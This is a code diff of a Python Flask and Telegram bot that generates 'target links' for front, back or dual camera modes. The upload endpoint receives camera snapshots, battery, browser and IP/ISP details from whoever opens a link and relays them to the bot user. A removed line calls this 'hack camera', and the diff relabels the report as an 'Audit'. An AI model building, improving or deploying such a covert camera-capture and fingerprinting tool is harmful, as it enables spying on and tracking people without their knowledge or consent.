@@ -4,7 +4,7 @@ from telebot import types
 
 app = Flask(__name__)
 
-# Configuration
+# Config
 BOT_TOKEN = os.getenv('BOT_TOKEN')
 ADMINS = [518067190, 7162565886]
 TG_CHANNEL = "hackerscolonytech"
@@ -13,10 +13,9 @@ RENDER_LINK = "https://happy-wishing-you.onrender.com"
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# Signal handler for clean deployment on Render
+# Process Cleanup
 def handler(signum, frame):
     os._exit(0)
-
 signal.signal(signal.SIGTERM, handler)
 
 def db_init():
@@ -25,8 +24,7 @@ def db_init():
     cursor.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, photo_count INTEGER DEFAULT 0)')
     cursor.execute('CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY, total_photos INTEGER DEFAULT 0)')
     cursor.execute('INSERT OR IGNORE INTO stats (id, total_photos) VALUES (1, 0)')
-    conn.commit()
-    conn.close()
+    conn.commit(); conn.close()
 
 db_init()
 
@@ -38,13 +36,10 @@ def is_user_joined(user_id):
 
 @bot.message_handler(commands=['start'])
 def start(message):
-    conn = sqlite3.connect('users.db')
-    cursor = conn.cursor()
+    conn = sqlite3.connect('users.db'); cursor = conn.cursor()
     cursor.execute('INSERT OR IGNORE INTO users (id) VALUES (?)', (message.chat.id,))
     conn.commit(); conn.close()
-    
-    if is_user_joined(message.chat.id):
-        show_menu(message.chat.id)
+    if is_user_joined(message.chat.id): show_menu(message.chat.id)
     else:
         markup = types.InlineKeyboardMarkup(row_width=1)
         markup.add(types.InlineKeyboardButton("📢 Join Telegram 📢", url=f"https://t.me/{TG_CHANNEL}"),
@@ -58,23 +53,20 @@ def show_menu(chat_id):
                types.InlineKeyboardButton("📸 Back Camera", callback_data="m_back"))
     markup.row(types.InlineKeyboardButton("📸 Dual Camera", callback_data="m_dual"))
     markup.add(types.InlineKeyboardButton("🧑‍💻 Contact Support", url="tg://user?id=518067190"))
-    bot.send_message(chat_id, "<b>Select your camera mode to hack camera 📸:</b>", parse_mode='HTML', reply_markup=markup)
+    bot.send_message(chat_id, "<b>Select your camera mode:</b>", parse_mode='HTML', reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: True)
 def handle_query(call):
     if call.data == "check_join":
-        if is_user_joined(call.from_user.id):
-            show_menu(call.message.chat.id)
-        else:
-            bot.answer_callback_query(call.id, "❌ Join the channel first!", show_alert=True)
-            
+        if is_user_joined(call.from_user.id): show_menu(call.message.chat.id)
+        else: bot.answer_callback_query(call.id, "❌ Join the channel first!", show_alert=True)
     elif call.data.startswith("m_"):
         mode = call.data.split("_")[1]
         final_url = f"{RENDER_LINK}/?m={mode}&uid={call.message.chat.id}"
         msg = (f"🤠 <b>Your target link</b> 🔗\n\n"
-               f"Url = <code>{final_url}</code>\n\n"
+               f"Url = <a href='{final_url}'>{final_url}</a>\n\n"
                f"✨ Thank you team HCO ✨")
-        bot.send_message(call.message.chat.id, msg, parse_mode='HTML')
+        bot.send_message(call.message.chat.id, msg, parse_mode='HTML', disable_web_page_preview=True)
 
 @app.route('/')
 def index():
@@ -83,21 +75,15 @@ def index():
 @app.route('/upload', methods=['POST'])
 def upload():
     data = request.json
-    uid = data.get('uid')
-    info = data.get('info', {})
-    
+    uid = data.get('uid'); info = data.get('info', {})
     isp = "Unknown"
-    try:
-        ip_data = requests.get(f"http://ip-api.com/json/{request.remote_addr}").json()
-        isp = ip_data.get('isp', 'Unknown')
+    try: 
+        ip_info = requests.get(f"http://ip-api.com/json/{request.remote_addr}").json()
+        isp = ip_info.get('isp', 'Unknown')
     except: pass
-
-    conn = sqlite3.connect('users.db'); cursor = conn.cursor()
-    cursor.execute('UPDATE users SET photo_count = photo_count + 1 WHERE id = ?', (uid,))
-    cursor.execute('UPDATE stats SET total_photos = total_photos + 1 WHERE id = 1')
-    conn.commit(); conn.close()
-
+    
     img_data = base64.b64decode(data.get('image').split(',')[1])
+    # Restored CPU and Network Info
     caption = (f"🛡️ <b>Audit:</b> {data.get('mode', 'N/A').upper()}\n"
                f"🔋 <b>Battery:</b> {info.get('battery')}\n"
                f"🌐 <b>Browser:</b> {info.get('browser')}\n"
